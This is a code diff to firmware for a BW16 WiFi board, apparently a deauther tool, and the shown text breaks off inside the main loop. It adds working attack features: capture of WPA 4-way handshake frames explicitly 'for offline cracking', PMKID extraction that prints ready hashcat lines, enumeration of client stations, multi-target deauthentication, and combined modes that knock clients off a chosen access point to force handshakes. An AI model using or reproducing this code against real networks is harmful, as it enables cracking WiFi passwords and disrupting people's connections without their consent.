@@ -384,6 +384,21 @@ uint32_t current_num = 0;
 // station-enum ports are feasible; if not, they're off the table. RTW_PROMISC_ENABLE
 // + len_used=1 delivers Ethernet frames, so EAPOL shows up as ethertype 0x888e. ---
 static volatile uint32_t pm_total = 0, pm_mgmt = 0, pm_ctrl = 0, pm_data = 0, pm_eapol = 0;
+
+// --- P5: WPA 4-way handshake capture -------------------------------------------
+// When `hs_cap` is set, every EAPOL (802.1X) data frame seen on the monitored channel
+// is copied verbatim (full 802.11 header, no FCS) into a small RAM ring. After the
+// capture window we stream the raw frames over Serial/Serial1 as `HSFRAME:<hex>` lines
+// so the host can rebuild a LINKTYPE_IEEE802_11 pcap (see firmware-build/hs_to_pcap.py).
+// Gate result proving this is viable: ch2 -> total=1208 mgmt=750 data=458 eapol=0
+// (data/metrics flow; eapol=0 only because no full 4-way occurred in the passive window).
+#define HS_MAX 12          // frames kept per capture (a full 4-way is 4)
+#define HS_FRAME_MAX 256   // per-frame byte cap
+static volatile bool hs_cap = false;
+static volatile uint16_t hs_count = 0;
+static uint8_t hs_frames[HS_MAX][HS_FRAME_MAX];
+static uint16_t hs_lens[HS_MAX];
+
 // RTW_PROMISC_ENABLE_2 (raw 802.11): buf[0] = frame control. type bits (buf[0]>>2)&3:
 // 0=mgmt 1=ctrl 2=data. EAPOL rides in a data frame after the 802.11 hdr + LLC/SNAP,
 // ethertype 0x888e at offset 30 (non-QoS) or 32 (QoS data).
@@ -397,9 +412,312 @@ static void promisc_spike_cb(unsigned char *buf, unsigned int len, void *userdat
   else if (ftype == 2) {
     pm_data++;
     if ((len >= 32 && buf[30] == 0x88 && buf[31] == 0x8e) ||
-        (len >= 34 && buf[32] == 0x88 && buf[33] == 0x8e)) pm_eapol++;
+        (len >= 34 && buf[32] == 0x88 && buf[33] == 0x8e)) {
+      pm_eapol++;
+      // Keep the whole frame (M1..M4) for offline cracking. memcpy only — this runs in
+      // the driver/WiFi task, so no String/heap work here.
+      if (hs_cap && hs_count < HS_MAX) {
+        uint16_t n = (len < HS_FRAME_MAX) ? (uint16_t)len : (uint16_t)HS_FRAME_MAX;
+        memcpy(hs_frames[hs_count], buf, n);
+        hs_lens[hs_count] = n;
+        hs_count++;
+      }
+    }
   }
 }
+
+// Dump the captured EAPOL frames as hex lines the host tool turns into a .pcap.
+static void hs_stream(int ch) {
+  uint16_t n = hs_count;
+  String hdr = "HSCAP: ch=" + String(ch) + " count=" + String((unsigned)n);
+  Serial.println(hdr); Serial1.println(hdr);
+  for (uint16_t i = 0; i < n; i++) {
+    String line = "HSFRAME:";
+    line.reserve(2 * hs_lens[i] + 12);
+    for (uint16_t j = 0; j < hs_lens[i]; j++) {
+      char b[3];
+      snprintf(b, sizeof(b), "%02x", hs_frames[i][j]);
+      line += b;
+    }
+    Serial.println(line); Serial1.println(line);
+  }
+  String fin = "HSDONE:" + String((unsigned)n);
+  Serial.println(fin); Serial1.println(fin);
+}
+
+// --- P1: channel hop ---
+static volatile bool hopping = false;
+static volatile uint32_t hop_interval_ms = 500;
+static const uint8_t hop_channels[] = {1,2,3,4,5,6,7,8,9,10,11,12,13};
+
+// --- P2: PMF/WPA3 classification from the RSN IE of beacons / probe responses ---
+// The scan API (rtw_scan_result_t, wifi_structures.h) exposes only a coarse security
+// bitmask, so 802.11w MFP required/capable and SAE must be read from the RSN IE
+// (tag 48). We harvest it from promisc and report per-BSSID. RSN capabilities bits:
+// B6 = MFPR (required), B7 = MFPC (capable). AKM suite type 8 = SAE, 9 = FT-SAE.
+#define PMF_MAX_APS 16
+typedef struct {
+  uint8_t bssid[6];
+  char ssid[33];
+  uint16_t caps;  // RSN capabilities
+  uint8_t sae;    // SAE / FT-SAE present
+  uint8_t n_akm;
+} pmf_ap_t;
+static pmf_ap_t pmf_aps[PMF_MAX_APS];
+static volatile uint8_t pmf_n = 0;
+
+static void pmf_parse(const uint8_t* f, unsigned len) {
+  if (len < 36) return;
+  uint8_t st = (f[0] >> 4) & 0xF;
+  if (st != 8 && st != 5) return;           // beacon / probe response only
+  const uint8_t* bssid = f + 16;            // addr3 == BSSID
+  char ssid[33];
+  ssid[0] = 0;
+  uint16_t rcaps = 0;
+  int have_rsn = 0, sae = 0, nakm = 0;
+  unsigned i = 36;                          // 24-byte mgmt hdr + 12-byte fixed params
+  while (i + 2 <= len) {
+    uint8_t id = f[i], l = f[i + 1];
+    unsigned d = i + 2;
+    if (d + l > len) break;
+    if (id == 0) {                          // SSID
+      uint8_t n = l < 32 ? l : 32;
+      memcpy(ssid, f + d, n);
+      ssid[n] = 0;
+    } else if (id == 48 && l >= 8) {        // RSN IE
+      unsigned p = d + 2;                   // skip version
+      p += 4;                               // group cipher suite
+      if (p + 2 <= d + l) {
+        uint16_t pc = f[p] | (f[p + 1] << 8);
+        p += 2 + 4 * (unsigned)pc;          // pairwise count + suites
+      }
+      if (p + 2 <= d + l) {
+        uint16_t ac = f[p] | (f[p + 1] << 8);
+        p += 2;
+        for (int k = 0; k < ac && p + 4 <= d + l; k++, p += 4) {
+          uint8_t t = f[p + 3];
+          if (t == 8 || t == 9) sae = 1;
+          nakm++;
+        }
+      }
+      if (p + 2 <= d + l) rcaps = f[p] | (f[p + 1] << 8);
+      have_rsn = 1;
+    }
+    i = d + l;
+  }
+  if (!have_rsn) return;
+  for (uint8_t k = 0; k < pmf_n; k++)
+    if (!memcmp(pmf_aps[k].bssid, bssid, 6)) return;   // already seen
+  if (pmf_n >= PMF_MAX_APS) return;
+  pmf_ap_t* a = &pmf_aps[pmf_n];
+  memcpy(a->bssid, bssid, 6);
+  memcpy(a->ssid, ssid, sizeof(a->ssid));
+  a->caps = rcaps;
+  a->sae = sae;
+  a->n_akm = nakm;
+  pmf_n++;
+}
+
+static void promisc_pmf_cb(unsigned char* buf, unsigned int len, void* userdata) {
+  (void)userdata;
+  pmf_parse(buf, len);
+}
+
+static void pmf_stream(int ch) {
+  for (uint8_t k = 0; k < pmf_n; k++) {
+    pmf_ap_t* a = &pmf_aps[k];
+    const char* mfp = (a->caps & 0x0040) ? "req" : (a->caps & 0x0080) ? "cap" : "no";
+    char line[128];
+    snprintf(line, sizeof(line),
+      "PMF:%02X:%02X:%02X:%02X:%02X:%02X|%s|akm=%u|sae=%u|mfp=%s",
+      a->bssid[0], a->bssid[1], a->bssid[2], a->bssid[3], a->bssid[4], a->bssid[5],
+      a->ssid, (unsigned)a->n_akm, (unsigned)a->sae, mfp);
+    Serial.println(line); Serial1.println(line);
+  }
+  String fin = "PMFDONE: ch=" + String(ch) + " aps=" + String((unsigned)pmf_n);
+  Serial.println(fin); Serial1.println(fin);
+}
+
+// --- P4: STASCAN — enumerate stations associated to a BSSID from promisc ------
+// No RSSI here: the promisc callback only gets (buf, len) — the driver strips the
+// radiotap header — so we report MAC + frame count only.
+#define STA_MAX 24
+typedef struct { uint8_t mac[6]; uint16_t count; } sta_t;
+static sta_t sta_list[STA_MAX];
+static volatile uint8_t sta_n = 0;
+static uint8_t sta_filter[6];
+static volatile bool sta_filter_on = false;
+
+static void sta_add(const uint8_t* mac) {
+  for (uint8_t i = 0; i < sta_n; i++)
+    if (!memcmp(sta_list[i].mac, mac, 6)) { sta_list[i].count++; return; }
+  if (sta_n >= STA_MAX) return;
+  memcpy(sta_list[sta_n].mac, mac, 6);
+  sta_list[sta_n].count = 1;
+  sta_n++;
+}
+
+static void promisc_sta_cb(unsigned char* buf, unsigned int len, void* ud) {
+  (void)ud;
+  if (len < 24) return;
+  uint8_t ftype = (buf[0] >> 2) & 3;
+  uint8_t st = (buf[0] >> 4) & 0xF;
+  uint8_t tods = buf[1] & 0x01, fromds = (buf[1] >> 1) & 0x01;
+  const uint8_t *a1 = buf + 4, *a2 = buf + 10, *a3 = buf + 16;
+  const uint8_t* sta = NULL;
+  if (ftype == 2) {                                    // data
+    if (tods && !fromds) { if (sta_filter_on && memcmp(a1, sta_filter, 6)) return; sta = a2; }
+    else if (!tods && fromds) { if (sta_filter_on && memcmp(a2, sta_filter, 6)) return; sta = a1; }
+    else return;                                       // IBSS / WDS — ambiguous
+  } else if (ftype == 0) {                             // mgmt: auth(11)/assoc-req(0)/reassoc-req(2)
+    if (st != 11 && st != 0 && st != 2) return;
+    if (sta_filter_on && memcmp(a3, sta_filter, 6)) return;
+    sta = a2;
+  } else return;
+  if (sta && !(sta[0] & 0x01)) sta_add(sta);           // skip multicast/broadcast
+}
+
+static void sta_stream(int ch) {
+  for (uint8_t i = 0; i < sta_n; i++) {
+    char line[64];
+    snprintf(line, sizeof(line), "STA:%02X:%02X:%02X:%02X:%02X:%02X|%u",
+      sta_list[i].mac[0], sta_list[i].mac[1], sta_list[i].mac[2],
+      sta_list[i].mac[3], sta_list[i].mac[4], sta_list[i].mac[5],
+      (unsigned)sta_list[i].count);
+    Serial.println(line); Serial1.println(line);
+  }
+  String fin = "STADONE: ch=" + String(ch) + " n=" + String((unsigned)sta_n);
+  Serial.println(fin); Serial1.println(fin);
+}
+
+// --- P6: PMKID extraction from EAPOL-Key M1 ----------------------------------
+// Clientless PMKID: many WPA2 APs put the PMKID in the RSN key-data KDE of the very
+// first EAPOL-Key (M1). We identify M1 (key info ACK set, MIC clear, RSN descriptor)
+// and pull the 16-byte PMKID from KDE `dd 14 00 0f ac 04`. If the AP was scanned we
+// also emit a ready hashcat -m 22000 line; otherwise the raw PMKID + MACs.
+#define PMKID_MAX 8
+typedef struct { uint8_t ap[6], sta[6], pmkid[16]; } pmkid_t;
+static pmkid_t pmkids[PMKID_MAX];
+static volatile uint8_t pmkid_n = 0;
+
+static void hex12(const uint8_t* m, char* out) {
+  snprintf(out, 13, "%02x%02x%02x%02x%02x%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
+}
+
+static void pmkid_handle(const uint8_t* buf, unsigned len) {
+  unsigned e;
+  if (len >= 32 && buf[30] == 0x88 && buf[31] == 0x8e) e = 32;          // + LLC/SNAP -> EAPOL
+  else if (len >= 34 && buf[32] == 0x88 && buf[33] == 0x8e) e = 34;     // QoS data
+  else return;
+  if (e + 99 > len) return;                    // EAPOL-Key fixed part is 95 B after hdr
+  if (buf[e + 1] != 3) return;                 // EAPOL type = EAPOL-Key
+  if (buf[e + 4] != 2) return;                 // RSN key descriptor
+  // Key Information is big-endian; ACK = bit 7 (0x0080), MIC = bit 8 (0x0100).
+  uint16_t ki = ((uint16_t)buf[e + 5] << 8) | buf[e + 6];
+  if (!(ki & 0x0080) || (ki & 0x0100)) return; // M1: ACK set, MIC clear
+  uint16_t kdl = ((uint16_t)buf[e + 97] << 8) | buf[e + 98];
+  if (kdl < 22 || e + 99 + (unsigned)kdl > len) return;
+  const uint8_t* kd = buf + e + 99;
+  for (unsigned i = 0; i + 22 <= kdl; i++) {
+    if (kd[i] == 0xdd && kd[i+1] == 0x14 && kd[i+2] == 0x00 &&
+        kd[i+3] == 0x0f && kd[i+4] == 0xac && kd[i+5] == 0x04) {
+      const uint8_t* ap = (buf[1] & 0x02) ? buf + 10 : buf + 16;   // addr2 if FromDS
+      const uint8_t* sta = buf + 4;                                // addr1 = receiver
+      for (uint8_t k = 0; k < pmkid_n; k++)
+        if (!memcmp(pmkids[k].pmkid, kd + i + 6, 16)) return;      // dedupe
+      if (pmkid_n >= PMKID_MAX) return;
+      memcpy(pmkids[pmkid_n].ap, ap, 6);
+      memcpy(pmkids[pmkid_n].sta, sta, 6);
+      memcpy(pmkids[pmkid_n].pmkid, kd + i + 6, 16);
+      pmkid_n++;
+      return;
+    }
+  }
+}
+
+static void promisc_pmkid_cb(unsigned char* buf, unsigned int len, void* ud) {
+  (void)ud;
+  if (len < 34 || ((buf[0] >> 2) & 3) != 2) return;   // data frames only
+  pmkid_handle(buf, len);
+}
+
+static void pmkid_stream(int ch) {
+  for (uint8_t i = 0; i < pmkid_n; i++) {
+    pmkid_t* p = &pmkids[i];
+    char ap[13], sta[13], pm[33];
+    hex12(p->ap, ap);
+    hex12(p->sta, sta);
+    for (int k = 0; k < 16; k++) snprintf(pm + k*2, 3, "%02x", p->pmkid[k]);
+    String ssid = "";
+    for (unsigned j = 0; j < scan_results.size(); j++)
+      if (!memcmp(scan_results[j].bssid, p->ap, 6)) { ssid = scan_results[j].ssid; break; }
+    if (ssid.length() > 0) {
+      String sh = "";
+      for (unsigned k = 0; k < ssid.length(); k++) { char b[3]; snprintf(b, 3, "%02x", (uint8_t)ssid[k]); sh += b; }
+      String line = "WPA*01*" + String(pm) + "*" + String(ap) + "*" + String(sta) + "*" + sh + "***";
+      Serial.println(line); Serial1.println(line);
+    } else {
+      String line = "PMKID:" + String(ap) + "|" + String(sta) + "|" + String(pm);
+      Serial.println(line); Serial1.println(line);
+    }
+  }
+  String fin = "PMKIDDONE: ch=" + String(ch) + " n=" + String((unsigned)pmkid_n);
+  Serial.println(fin); Serial1.println(fin);
+}
+
+// --- A: HELLO/IDENT handshake + capability advertisement ----------------------
+// Mirrors 5Ghost's HELLO -> IDENT so a host can version-check and gate features.
+// caps letters (5Ghost-compatible): D=deauth S=stascan E=evil/AP B=beacon H=handshake.
+// We advertise "DSEBH" (no BLE -> no L/I/C/K).
+#define DELFY_FW_VERSION "1.0.0"
+#define DELFY_FW_CAPS    "DSEBH"
+
+// --- C: P3 multi-target deauth list (DEAUTHADD / DEAUTHRUN) -------------------
+#define DAUTH_MAX 8
+typedef struct {
+  uint8_t bssid[6];
+  uint8_t client[6];
+  uint8_t ch;
+  bool have_client;
+} dauth_t;
+static dauth_t dauth_list[DAUTH_MAX];
+static volatile uint8_t dauth_n = 0;
+static volatile bool dauth_run = false;
+static uint8_t dauth_idx = 0;
+
+static void hex_to_mac(const String& h, uint8_t* out) {
+  for (int i = 0; i < 6; i++)
+    out[i] = (uint8_t)strtoul(h.substring(i * 2, i * 2 + 2).c_str(), NULL, 16);
+}
+
+static void dauth_add(const uint8_t* bssid, const uint8_t* client, bool have_client, uint8_t ch) {
+  if (dauth_n >= DAUTH_MAX) return;
+  dauth_t* t = &dauth_list[dauth_n];
+  memcpy(t->bssid, bssid, 6);
+  if (have_client && client) memcpy(t->client, client, 6);
+  else memset(t->client, 0xFF, 6);
+  t->have_client = have_client;
+  t->ch = ch;
+  dauth_n++;
+}
+
+// Async grab state (HSGRAB/PKGRAB). A blocking deauth burst stalls the WiFi task on
+// this driver, so the deauth is driven from the main loop (same cadence as DEAUTHRUN,
+// which is proven), then the state flips to promisc capture.
+#define HSG_IDLE    0
+#define HSG_DEAUTH  1
+#define HSG_CAPTURE 2
+static volatile int hsg_phase = HSG_IDLE;
+static volatile uint32_t hsg_t = 0;
+static volatile uint32_t hsg_deauth_ms = 4000;
+static volatile uint32_t hsg_cap_ms = 15000;
+static volatile bool hsg_pmkid = false;
+static uint8_t hsg_bssid[6];
+static volatile int hsg_ch = 6;
+// B: async passive CAPTURE (armed by CAPTURE, finished by loop() or CAPSTOP).
+static volatile bool cap_active = false;
+static volatile uint32_t cap_deadline = 0;
+static volatile int cap_ch = 6;
 
 void loop() {
   while (Serial1.available()) {
@@ -435,7 +753,10 @@ void loop() {
       
     }else if(readString.substring(0,4)=="STOP"){
       DEBUG_SER_PRINT("Stop deauthing\n");
-      
+      dauth_run = false;   // C: also disarm the multi-target deauth list
+      dauth_n = 0;
+      if(cap_active){ wifi_set_promisc(0, NULL, 0); hs_cap = false; cap_active = false; }
+      hsg_phase = HSG_IDLE;  // abort any in-flight HSGRAB/PKGRAB
       secured = false;
       strcpy(wpa_pass,"");
       if(readString.length()>5 && !apActive){
@@ -556,6 +877,43 @@ void loop() {
         useCustomMac=false;
       }
        
+    }else if(readString.substring(0,5)=="HELLO"){
+      // A: capability/handshake advertisement (5Ghost-compatible shape).
+      String id = String("IDENT:brand=DELFY;fw=") + DELFY_FW_VERSION +
+                  ";proto=1;caps=" + DELFY_FW_CAPS + ";board=BW16";
+      Serial.println(id); Serial1.println(id);
+    }else if(readString.substring(0,9)=="DEAUTHADD"){
+      // C: add a target to the multi-target deauth list.
+      // Args: DEAUTHADD <bssid-12hex> [client-12hex] [ch]
+      int s1 = readString.indexOf(' ');
+      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
+      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
+      String b = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
+      String c = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("");
+      int ch = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 6;
+      if(b.length() != 12 || ch < 1 || ch > 165){
+        Serial.println("ERR:DEAUTHADD:badargs"); Serial1.println("ERR:DEAUTHADD:badargs");
+      }else if(dauth_n >= DAUTH_MAX){
+        Serial.println("ERR:DEAUTHADD:full"); Serial1.println("ERR:DEAUTHADD:full");
+      }else{
+        uint8_t bssid[6]; hex_to_mac(b, bssid);
+        uint8_t client[6]; bool have = false;
+        if(c.length() == 12){ hex_to_mac(c, client); have = true; }
+        dauth_add(bssid, have ? client : NULL, have, (uint8_t)ch);
+        String r = "DEAUTHADD:OK n=" + String((unsigned)dauth_n);
+        Serial.println(r); Serial1.println(r);
+      }
+    }else if(readString.substring(0,9)=="DEAUTHRUN"){
+      // C: arm the accumulated list (round-robin in loop()).
+      dauth_run = (dauth_n > 0);
+      dauth_idx = 0;
+      String r = "DEAUTHRUN:" + String(dauth_run ? "on n=" : "no-targets n=") + String((unsigned)dauth_n);
+      Serial.println(r); Serial1.println(r);
+    }else if(readString.substring(0,11)=="DEAUTHCLEAR"){
+      // C: clear the list WITHOUT the WiFi teardown that STOP does.
+      dauth_run = false;
+      dauth_n = 0;
+      Serial.println("DEAUTHCLEAR:ok"); Serial1.println("DEAUTHCLEAR:ok");
     }else if(readString.substring(0,6)=="DEAUTH" || readString.substring(0,4)=="EVIL"){
       int numStation;
       if(readString.substring(0,4)=="EVIL"){
@@ -619,23 +977,242 @@ void loop() {
       }
 
     }else if(readString.substring(0,11)=="PROMISCTEST"){
-      // GATE experiment: set channel, capture Ethernet frames for 10s, report counts.
-      int ch = readString.substring(12, readString.length()-1).toInt();
+      // GATE experiment: set channel, passively capture 802.11 frames, report counts.
+      // Args: PROMISCTEST <chan> [seconds]  (default 10s, max 60s).
+      int s1 = readString.indexOf(' ');
+      int s2 = readString.indexOf(' ', s1+1);
+      int ch = readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt();
+      int secs = (s2>0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
       if(ch < 1 || ch > 165) ch = 6;
+      if(secs < 1 || secs > 60) secs = 10;
       pm_total=0; pm_mgmt=0; pm_ctrl=0; pm_data=0; pm_eapol=0;
       wext_set_channel(WLAN0_NAME, ch);
       wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_spike_cb, 0);
-      for(int i=0;i<10;i++) delay(1000);
+      for(int i=0;i<secs;i++) delay(1000);
       wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
       String r = "PROMISC: ch="+String(ch)+" total="+String((unsigned)pm_total)+
                  " mgmt="+String((unsigned)pm_mgmt)+" ctrl="+String((unsigned)pm_ctrl)+
                  " data="+String((unsigned)pm_data)+" eapol="+String((unsigned)pm_eapol);
       Serial.println(r); Serial1.println(r);
+    }else if(readString.substring(0,7)=="CAPTURE"){
+      // P5: monitor <chan> for [secs] and stream any EAPOL (4-way) frames as HSFRAME:<hex>.
+      // Passive — no injection. Args: CAPTURE <chan> [seconds]  (default 10s, max 60s).
+      int s1 = readString.indexOf(' ');
+      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
+      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
+      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
+      if(ch < 1 || ch > 165) ch = 6;
+      if(secs < 1 || secs > 60) secs = 10;
+      hs_count = 0;
+      cap_ch = ch;
+      hs_cap = true;
+      wext_set_channel(WLAN0_NAME, ch);
+      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_spike_cb, 0);
+      cap_deadline = millis() + (uint32_t)secs * 1000u;
+      cap_active = true;   // loop() finishes it after `secs`; CAPSTOP aborts early
+      Serial.println("CAPTURE: armed"); Serial1.println("CAPTURE: armed");
+    }else if(readString.substring(0,7)=="CAPSTOP"){
+      // B: abort an in-flight capture and stream what we have.
+      if(cap_active){
+        wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
+        hs_cap = false;
+        cap_active = false;
+        hs_stream(cap_ch);
+      }else{
+        Serial.println("CAPSTOP: idle"); Serial1.println("CAPSTOP: idle");
+      }
+    }else if(readString.substring(0,6)=="HSGRAB"){
+      // P5 active: capture on <chan> while deauthing <bssid> to force a fresh 4-way.
+      // Args: HSGRAB <chan> <bssid-12hex> [seconds]  (default 10s, max 60s).
+      // CAVEAT: injection during promisc is unverified on this driver — if no EAPOL lands,
+      // stop, deauth in STA mode for ~2s, then run CAPTURE (clients re-assoc in 1-3s).
+      int s1 = readString.indexOf(' ');
+      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
+      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
+      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
+      String bssid_hex = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("");
+      int secs = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 10;
+      if(ch < 1 || ch > 165) ch = 6;
+      if(secs < 1 || secs > 60) secs = 10;
+      uint8_t bssid[6]; bool ok_bssid = (bssid_hex.length() == 12);
+      for(int i=0; ok_bssid && i < 6; i++)
+        bssid[i] = (uint8_t)strtoul(bssid_hex.substring(i*2, i*2+2).c_str(), NULL, 16);
+      if(!ok_bssid){
+        Serial.println("ERROR: HSGRAB needs <chan> <bssid-12hex> [secs]");
+        Serial1.println("ERROR: HSGRAB needs <chan> <bssid-12hex> [secs]");
+      }else{
+        hs_count = 0;
+        memcpy(hsg_bssid, bssid, 6);
+        hsg_ch = ch;
+        hsg_cap_ms = (uint32_t)secs * 1000u;
+        hsg_pmkid = false;
+        wext_set_channel(WLAN0_NAME, ch);
+        hsg_t = millis();
+        hsg_phase = HSG_DEAUTH;   // loop() deauths, then flips to promisc capture
+        Serial.println("HSGRAB: armed"); Serial1.println("HSGRAB: armed");
+      }
+    }else if(readString.substring(0,3)=="HOP"){
+      // P1: channel hop. Args: HOP <interval_ms>  (0 = stop). Cycles 1..13.
+      int ms = readString.substring(4, readString.length()-1).toInt();
+      if (ms <= 0) {
+        hopping = false;
+      } else {
+        hop_interval_ms = (ms < 100) ? 100 : ((ms > 5000) ? 5000 : (uint32_t)ms);
+        hopping = true;
+      }
+      String r = String("HOP:") + (hopping ? "on " : "off ") + String(hopping ? (unsigned)hop_interval_ms : 0u);
+      Serial.println(r); Serial1.println(r);
+    }else if(readString.substring(0,7)=="PMFSCAN"){
+      // P2: classify nearby APs (PMF-required / SAE / #AKMs) from the beacon RSN IE.
+      // Args: PMFSCAN <chan> [secs]  (default 5s, max 60s).
+      int s1 = readString.indexOf(' ');
+      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
+      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
+      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 5;
+      if(ch < 1 || ch > 165) ch = 6;
+      if(secs < 1 || secs > 60) secs = 5;
+      pmf_n = 0;
+      wext_set_channel(WLAN0_NAME, ch);
+      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_pmf_cb, 0);
+      for(int i=0;i<secs;i++) delay(1000);
+      wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
+      pmf_stream(ch);
+    }else if(readString.substring(0,7)=="STASCAN"){
+      // P4: list stations seen for a BSSID. Args: STASCAN <chan> [secs] [bssid-12hex]
+      int s1 = readString.indexOf(' ');
+      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
+      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
+      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
+      String bssid_hex = "";
+      int secs = 5;
+      if (s2 > 0) {
+        String a2s = readString.substring(s2+1, s3>0?s3:readString.length()-1);
+        if (a2s.length() == 12) {   // 12 hex chars -> BSSID filter, secs becomes 3rd arg
+          bssid_hex = a2s;
+          secs = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 5;
+        } else {
+          secs = a2s.toInt();
+        }
+      }
+      if(ch < 1 || ch > 165) ch = 6;
+      if(secs < 1 || secs > 60) secs = 5;
+      sta_n = 0;
+      sta_filter_on = (bssid_hex.length() == 12);
+      for(int i=0; sta_filter_on && i<6; i++)
+        sta_filter[i] = (uint8_t)strtoul(bssid_hex.substring(i*2, i*2+2).c_str(), NULL, 16);
+      wext_set_channel(WLAN0_NAME, ch);
+      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_sta_cb, 0);
+      for(int i=0;i<secs;i++) delay(1000);
+      wifi_set_promisc(0, NULL, 0);
+      sta_stream(ch);
+    }else if(readString.substring(0,5)=="PMKID"){
+      // P6 passive: extract PMKID from any M1 seen. Args: PMKID <chan> [secs]
+      int s1 = readString.indexOf(' ');
+      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
+      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
+      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
+      if(ch < 1 || ch > 165) ch = 6;
+      if(secs < 1 || secs > 60) secs = 10;
+      pmkid_n = 0;
+      wext_set_channel(WLAN0_NAME, ch);
+      wifi_set_promisc(3, promisc_pmkid_cb, 0);
+      for(int i=0;i<secs;i++) delay(1000);
+      wifi_set_promisc(0, NULL, 0);
+      pmkid_stream(ch);
+    }else if(readString.substring(0,6)=="PKGRAB"){
+      // P6 active: deauth <bssid> to force a client's M1, then extract PMKID.
+      // Args: PKGRAB <chan> <bssid-12hex> [secs]
+      int s1 = readString.indexOf(' ');
+      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
+      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
+      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
+      String bssid_hex = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("");
+      int secs = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 10;
+      if(ch < 1 || ch > 165) ch = 6;
+      if(secs < 1 || secs > 60) secs = 10;
+      uint8_t bssid[6]; bool ok = (bssid_hex.length() == 12);
+      for(int i=0; ok && i<6; i++)
+        bssid[i] = (uint8_t)strtoul(bssid_hex.substring(i*2, i*2+2).c_str(), NULL, 16);
+      if(!ok){
+        Serial.println("ERROR: PKGRAB needs <chan> <bssid-12hex> [secs]");
+        Serial1.println("ERROR: PKGRAB needs <chan> <bssid-12hex> [secs]");
+      }else{
+        pmkid_n = 0;
+        memcpy(hsg_bssid, bssid, 6);
+        hsg_ch = ch;
+        hsg_cap_ms = (uint32_t)secs * 1000u;
+        hsg_pmkid = true;
+        wext_set_channel(WLAN0_NAME, ch);
+        hsg_t = millis();
+        hsg_phase = HSG_DEAUTH;   // loop() deauths, then flips to PMKID capture
+        Serial.println("PKGRAB: armed"); Serial1.println("PKGRAB: armed");
+      }
     }
     readString="";
 
   }
   
+  // P1: channel hop tick
+  if (hopping) {
+    static uint32_t last_hop = 0;
+    static uint8_t hop_idx = 0;
+    if (millis() - last_hop >= hop_interval_ms) {
+      last_hop = millis();
+      hop_idx = (hop_idx + 1) % (uint8_t)sizeof(hop_channels);
+      wext_set_channel(WLAN0_NAME, hop_channels[hop_idx]);
+      digitalWrite(LED_G, !digitalRead(LED_G));
+    }
+  }
+
+  // B: async passive CAPTURE deadline (loop() finishes it; CAPSTOP aborts early)
+  if (cap_active && millis() >= cap_deadline) {
+    wifi_set_promisc(0, NULL, 0);
+    hs_cap = false;
+    cap_active = false;
+    hs_stream(cap_ch);
+  }
+
+  // HSGRAB/PKGRAB state machine: deauth (main-loop cadence) -> promisc capture.
+  if (hsg_phase == HSG_DEAUTH) {
+    wext_set_channel(WLAN0_NAME, hsg_ch);
+    for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
+      wifi_tx_deauth_frame(hsg_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
+      delay(5);
+    }
+    if (millis() - hsg_t >= hsg_deauth_ms) {
+      if (hsg_pmkid) wifi_set_promisc(3, promisc_pmkid_cb, 0);
+      else { hs_cap = true; wifi_set_promisc(3, promisc_spike_cb, 0); }
+      hsg_phase = HSG_CAPTURE;
+      hsg_t = millis();
+    } else {
+      delay(50);
+    }
+  } else if (hsg_phase == HSG_CAPTURE) {
+    if (millis() - hsg_t >= hsg_cap_ms) {
+      wifi_set_promisc(0, NULL, 0);
+      hs_cap = false;
+      if (hsg_pmkid) pmkid_stream(hsg_ch);
+      else hs_stream(hsg_ch);
+      hsg_phase = HSG_IDLE;
+    }
+  }
+
+  // C: multi-target deauth round-robin (DEAUTHADD/DEAUTHRUN)
+  if (dauth_run && dauth_n > 0) {
+    dauth_t* t = &dauth_list[dauth_idx];
+    static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
